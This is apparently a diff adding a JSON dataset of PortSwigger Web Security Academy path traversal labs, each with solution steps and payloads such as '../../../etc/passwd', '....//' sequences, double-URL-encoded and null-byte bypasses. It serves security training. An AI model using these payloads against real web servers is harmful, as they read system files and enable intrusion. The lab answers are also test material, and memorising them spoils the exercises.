@@ -1,0 +1,103 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass",
+    "category": "file-path-traversal",
+    "title": "File path traversal, traversal sequences blocked with absolute path bypass",
+    "description": "This lab contains a path traversal vulnerability in the display of product images.",
+    "solution_steps": [
+      "Use Burp Suite to intercept and modify a request that fetches a product image.",
+      "Modify the filename parameter, giving it the value /etc/passwd .",
+      "Observe that the response contains the contents of the /etc/passwd file."
+    ],
+    "solution": "1. Use Burp Suite to intercept and modify a request that fetches a product image.\n2. Modify the filename parameter, giving it the value /etc/passwd .\n3. Observe that the response contains the contents of the /etc/passwd file.",
+    "payloads": [
+      "/etc/passwd",
+      "filename"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively",
+    "category": "file-path-traversal",
+    "title": "File path traversal, traversal sequences stripped non-recursively",
+    "description": "This lab contains a path traversal vulnerability in the display of product images.",
+    "solution_steps": [
+      "Use Burp Suite to intercept and modify a request that fetches a product image.",
+      "Modify the filename parameter, giving it the value: ....//....//....//etc/passwd",
+      "Observe that the response contains the contents of the /etc/passwd file."
+    ],
+    "solution": "1. Use Burp Suite to intercept and modify a request that fetches a product image.\n2. Modify the filename parameter, giving it the value: ....//....//....//etc/passwd\n3. Observe that the response contains the contents of the /etc/passwd file.",
+    "payloads": [
+      "/etc/passwd",
+      "filename",
+      "....//....//....//etc/passwd"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/file-path-traversal/lab-simple",
+    "category": "file-path-traversal",
+    "title": "File path traversal, simple case",
+    "description": "This lab contains a path traversal vulnerability in the display of product images.",
+    "solution_steps": [
+      "Use Burp Suite to intercept and modify a request that fetches a product image.",
+      "Modify the filename parameter, giving it the value: ../../../etc/passwd",
+      "Observe that the response contains the contents of the /etc/passwd file."
+    ],
+    "solution": "1. Use Burp Suite to intercept and modify a request that fetches a product image.\n2. Modify the filename parameter, giving it the value: ../../../etc/passwd\n3. Observe that the response contains the contents of the /etc/passwd file.",
+    "payloads": [
+      "/etc/passwd",
+      "filename",
+      "../../../etc/passwd"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode",
+    "category": "file-path-traversal",
+    "title": "File path traversal, traversal sequences stripped with superfluous URL-decode",
+    "description": "This lab contains a path traversal vulnerability in the display of product images.",
+    "solution_steps": [
+      "Use Burp Suite to intercept and modify a request that fetches a product image.",
+      "Modify the filename parameter, giving it the value: ..%252f..%252f..%252fetc/passwd",
+      "Observe that the response contains the contents of the /etc/passwd file."
+    ],
+    "solution": "1. Use Burp Suite to intercept and modify a request that fetches a product image.\n2. Modify the filename parameter, giving it the value: ..%252f..%252f..%252fetc/passwd\n3. Observe that the response contains the contents of the /etc/passwd file.",
+    "payloads": [
+      "/etc/passwd",
+      "filename",
+      "..%252f..%252f..%252fetc/passwd"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass",
+    "category": "file-path-traversal",
+    "title": "File path traversal, validation of file extension with null byte bypass",
+    "description": "This lab contains a path traversal vulnerability in the display of product images.",
+    "solution_steps": [
+      "Use Burp Suite to intercept and modify a request that fetches a product image.",
+      "Modify the filename parameter, giving it the value: ../../../etc/passwd%00.png",
+      "Observe that the response contains the contents of the /etc/passwd file."
+    ],
+    "solution": "1. Use Burp Suite to intercept and modify a request that fetches a product image.\n2. Modify the filename parameter, giving it the value: ../../../etc/passwd%00.png\n3. Observe that the response contains the contents of the /etc/passwd file.",
+    "payloads": [
+      "/etc/passwd",
+      "filename",
+      "../../../etc/passwd%00.png"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path",
+    "category": "file-path-traversal",
+    "title": "File path traversal, validation of start of path",
+    "description": "This lab contains a path traversal vulnerability in the display of product images.",
+    "solution_steps": [
+      "Use Burp Suite to intercept and modify a request that fetches a product image.",
+      "Modify the filename parameter, giving it the value: /var/www/images/../../../etc/passwd",
+      "Observe that the response contains the contents of the /etc/passwd file."
+    ],
+    "solution": "1. Use Burp Suite to intercept and modify a request that fetches a product image.\n2. Modify the filename parameter, giving it the value: /var/www/images/../../../etc/passwd\n3. Observe that the response contains the contents of the /etc/passwd file.",
+    "payloads": [
+      "/etc/passwd",
+      "filename",
+      "/var/www/images/../../../etc/passwd"
+    ]
+  }
+]
